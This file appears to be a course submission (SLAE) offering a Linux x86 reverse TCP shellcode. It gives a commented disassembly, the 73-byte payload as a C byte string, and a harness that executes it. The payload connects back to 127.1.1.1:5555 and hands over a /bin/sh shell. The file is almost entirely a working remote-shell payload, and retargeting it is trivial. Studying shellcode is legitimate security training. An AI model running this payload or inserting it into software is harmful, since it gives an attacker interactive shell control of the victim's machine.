/**
# Linux x86 Reverse TCP shellcode
# 127.1.1.1/5555
# Shellcode Author: Anurag Srivastava
# Shellcode Length: 73
# Student-ID: SLAE-1219
# Note ~ http://www.theanuragsrivastava.in/2018/04/reverse-tcp-shellcode-x86-slae.html


reverse:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	6a 66                	push   0x66
 8048062:	58                   	pop    eax
 8048063:	31 db                	xor    ebx,ebx
 8048065:	53                   	push   ebx
 8048066:	43                   	inc    ebx
 8048067:	53                   	push   ebx
 8048068:	6a 02                	push   0x2
 804806a:	89 e1                	mov    ecx,esp
 804806c:	99                   	cdq
 804806d:	cd 80                	int    0x80
 804806f:	93                   	xchg   ebx,eax
 8048070:	59                   	pop    ecx

08048071 <loop>:
 8048071:	6a 3f                	push   0x3f
 8048073:	58                   	pop    eax
 8048074:	cd 80                	int    0x80
 8048076:	49                   	dec    ecx
 8048077:	79 f8                	jns    8048071 <loop>
 8048079:	68 7f 01 01 01       	push   0x101017f
 804807e:	66 68 15 b3          	pushw  0xb315
 8048082:	66 6a 02             	pushw  0x2
 8048085:	89 e1                	mov    ecx,esp
 8048087:	6a 10                	push   0x10
 8048089:	51                   	push   ecx
 804808a:	53                   	push   ebx
 804808b:	89 e1                	mov    ecx,esp
 804808d:	6a 66                	push   0x66
 804808f:	58                   	pop    eax
 8048090:	6a 03                	push   0x3
 8048092:	5b                   	pop    ebx
 8048093:	cd 80                	int    0x80
 8048095:	31 c9                	xor    ecx,ecx
 8048097:	51                   	push   ecx
 8048098:	6a 0b                	push   0xb
 804809a:	58                   	pop    eax
 804809b:	68 2f 2f 73 68       	push   0x68732f2f
 80480a0:	68 2f 62 69 6e       	push   0x6e69622f
 80480a5:	89 e3                	mov    ebx,esp
 80480a7:	cd 80                	int    0x80

**/

#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x6a\x66\x58\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\x99\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x7f\x01\x01\x01\x66\x68\x15\xb3\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\x6a\x66\x58\x6a\x03\x5b\xcd\x80\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
main()
{
printf("Shellcode Length:  %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}